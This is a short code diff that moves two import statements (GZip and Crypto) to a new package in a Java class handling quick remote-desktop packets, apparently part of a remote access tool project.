@@ -4,11 +4,11 @@ import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
 
 import pro.jrat.Slave;
+import pro.jrat.common.compress.GZip;
+import pro.jrat.common.crypto.Crypto;
 import pro.jrat.ui.frames.FrameQuickRemoteScreen;
 import pro.jrat.utils.ImageUtils;
 
-import com.redpois0n.common.compress.GZip;
-import com.redpois0n.common.crypto.Crypto;
 
 public class Packet68QuickDesktop extends AbstractIncomingPacket {
 
